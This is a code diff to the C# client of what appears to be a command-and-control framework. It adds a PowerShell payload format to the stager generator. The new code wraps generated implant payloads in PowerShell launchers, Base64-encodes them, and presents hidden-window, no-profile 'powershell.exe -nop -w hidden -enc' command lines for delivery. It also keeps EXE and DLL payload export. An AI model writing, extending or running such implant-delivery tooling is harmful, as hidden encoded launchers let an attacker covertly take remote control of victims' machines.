@@ -10,6 +10,7 @@ using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
+using System.Text;
 using System.Windows;
 using System.Windows.Controls;
 using System.Windows.Input;
@@ -25,7 +26,7 @@ namespace Client.ViewModels
         public string SleepInterval { get; set; } = "60";
         public string SleepJitter { get; set; } = "25";
         public DateTime KillDate { get; set; } = DateTime.UtcNow.AddDays(365);
-        public List<string> Formats { get; set; } = new List<string> { "Windows .NET EXE", "Windows .NET DLL" };
+        public List<string> Formats { get; set; } = new List<string> { "PowerShell", "Windows .NET EXE", "Windows .NET DLL" };
         public List<string> Frameworks { get; set; } = new List<string> { ".NET Framework 4" };
 
         private string _selectedListener;
@@ -79,20 +80,9 @@ namespace Client.ViewModels
                     break;
             }
 
-            req.TargetFramework = TargetFramework.Net40;
             req.KillDate = KillDate;
 
-            //var payloadReq = new StagerRequest
-            //{
-            //    listenerGuid = listenerGuid,
-            //    OutputType = OutputType.Dll,
-            //    SleepInterval = SleepInterval,
-            //    SleepJitter = SleepJitter,
-            //    KillDate = KillDate,
-            //    TargetFramework = TargetFramework.Net40
-            //};
-
-            if (SelectedFormat == Formats[0])
+            if (SelectedFormat.Equals("PowerShell", StringComparison.OrdinalIgnoreCase) || SelectedFormat.Contains("EXE", StringComparison.OrdinalIgnoreCase))
             {
                 req.OutputType = OutputType.Exe;
             }
@@ -123,23 +113,44 @@ namespace Client.ViewModels
             }
 
             window.Close();
-            
+
             if (payload.Length > 0)
             {
-                var save = new SaveFileDialog();
+                if (SelectedFormat.Equals("PowerShell", StringComparison.OrdinalIgnoreCase))
+                {
+                    var launcher = PowerShellLauncher.GenerateLauncher(payload);
+                    var encLauncher = Convert.ToBase64String(Encoding.Unicode.GetBytes(launcher));
 
-                if (SelectedFormat == Formats[0])
-                {
-                    save.Filter = "EXE (*.exe)|*.exe";
-                }
-                else if (SelectedFormat == Formats[1])
-                {
-                    save.Filter = "DLL (*.dll)|*.dll";
-                }
+                    var powerShellPayloadViewModel = new PowerShellPayloadViewModel
+                    {
+                        Launcher = $"powershell.exe -nop -w hidden -c \"{launcher}\"",
+                        EncLauncher = $@"powershell.exe -nop -w hidden -enc {encLauncher}",
+                    };
 
-                if ((bool)save.ShowDialog())
+                    var powerShellPayloadView = new PowerShellPayloadView
+                    {
+                        DataContext = powerShellPayloadViewModel
+                    };
+
+                    powerShellPayloadView.Show();
+                }
+                else
                 {
-                    File.WriteAllBytes(save.FileName, payload);
+                    var save = new SaveFileDialog();
+
+                    if (SelectedFormat.Contains("EXE", StringComparison.OrdinalIgnoreCase))
+                    {
+                        save.Filter = "EXE (*.exe)|*.exe";
+                    }
+                    else if (SelectedFormat.Contains("DLL", StringComparison.OrdinalIgnoreCase))
+                    {
+                        save.Filter = "DLL (*.dll)|*.dll";
+                    }
+
+                    if ((bool)save.ShowDialog())
+                    {
+                        File.WriteAllBytes(save.FileName, payload);
+                    }
                 }
             }
 
